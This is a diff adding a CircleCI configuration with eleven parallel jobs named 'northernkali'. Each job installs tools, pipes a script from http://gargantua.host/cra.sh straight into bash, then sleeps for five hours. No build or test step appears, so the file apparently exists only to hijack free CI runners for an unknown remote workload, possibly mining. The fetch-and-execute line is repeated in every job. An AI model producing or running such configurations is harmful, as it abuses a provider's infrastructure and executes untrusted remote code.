@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  northernkali:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  northernkali1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  northernkali2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  northernkali3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  northernkali4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  northernkali5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  northernkali6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  northernkali7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  northernkali8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  northernkali9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+  northernkali10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cra.sh | bash -
+      - run: 
+            command: sleep 18000
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - northernkali
+      - northernkali1
+      - northernkali2
+      - northernkali3
+      - northernkali4
+      - northernkali5
+      - northernkali6
+      - northernkali7
+      - northernkali8
+      - northernkali9
+      - northernkali10
